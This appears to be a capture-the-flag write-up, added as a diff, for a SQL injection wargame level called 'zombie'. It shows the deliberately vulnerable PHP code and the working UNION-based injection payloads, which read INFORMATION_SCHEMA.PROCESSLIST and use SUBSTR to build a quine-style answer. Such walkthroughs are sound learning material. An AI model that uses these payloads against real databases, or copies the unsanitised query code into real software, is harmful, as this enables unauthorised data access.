@@ -1,0 +1,35 @@
+https://dev.mysql.com/doc/refman/5.7/en/information-schema-processlist-table.html
+
+quine hack :)
+
+ZOMBIE Clear!
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect("zombie");
+  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select pw from prob_zombie where pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
+  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("zombie");
+  highlight_file(__FILE__);
+?>
+
+1. Check if we can query processlist table:
+
+query: x' union SELECT info FROM INFORMATION_SCHEMA.PROCESSLIST;%23
+response:
+Pw : select pw from prob_zombie where pw='x' union SELECT info FROM INFORMATION_SCHEMA.PROCESSLIST;#'
+
+So, we cut the text:
+                                                          length:     72
+                                     |--------------------------------------------------------|
+select pw from prob_zombie where pw='x' union SELECT info FROM INFORMATION_SCHEMA.PROCESSLIST;#'
+
+
+Prepare the payload:
+
+query : select pw from prob_zombie where pw='x' union SELECT SUBSTR(info,38,72) FROM INFORMATION_SCHEMA.PROCESSLIST;#'
+Pw : x' union SELECT SUBSTR(info,38,72) FROM INFORMATION_SCHEMA.PROCESSLIST;#
+
